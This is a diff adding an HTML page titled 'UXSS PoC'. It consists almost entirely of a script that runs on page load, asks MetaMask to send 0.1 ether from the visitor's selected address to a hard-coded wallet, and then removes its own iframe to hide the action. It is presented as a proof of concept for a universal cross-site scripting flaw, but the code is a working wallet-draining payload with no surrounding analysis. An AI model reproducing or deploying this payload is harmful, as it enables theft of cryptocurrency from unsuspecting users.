@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>UXSS PoC</title>
+</head>
+<body>
+    <script>
+        window.onload = function() {
+            // Create a Metamask transaction
+            ethereum.request({ method: 'eth_sendTransaction', params: [{
+                from: ethereum.selectedAddress,
+                to: '0x62842A4A9d0f6c56D0F1757E13A8Efdd4E7B8BD2',
+                value: web3.utils.toHex(web3.utils.toWei('0.1', 'ether')),
+            }],})
+            .then((txHash) => {
+                // Transaction successful
+                console.log(txHash);
+            })
+            .catch((error) => {
+                // Handle transaction error here
+                console.error(error);
+            });
+
+            // Close the iframe after the transaction
+            window.frameElement.parentNode.removeChild(window.frameElement);
+        };
+    </script>
+</body>
+</html>
